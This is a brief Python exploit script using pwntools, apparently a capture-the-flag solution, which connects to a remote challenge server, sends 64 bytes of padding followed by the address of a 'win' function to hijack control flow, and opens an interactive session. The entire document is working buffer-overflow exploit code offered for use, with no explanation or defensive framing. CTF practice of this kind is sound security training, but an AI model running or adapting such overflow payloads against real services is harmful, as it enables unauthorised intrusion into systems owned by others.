#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./canary_callback', checksec=False)

OFFSET_TO_CAST = 64
p = remote("offsec.m0lecon.it", 13518)
p.recvuntil(b"incantation:\n")

# padding until cast, then win address
payload = flat(
b"A" * OFFSET_TO_CAST,
p64(elf.sym.win)
)
p.send(payload)
p.interactive()
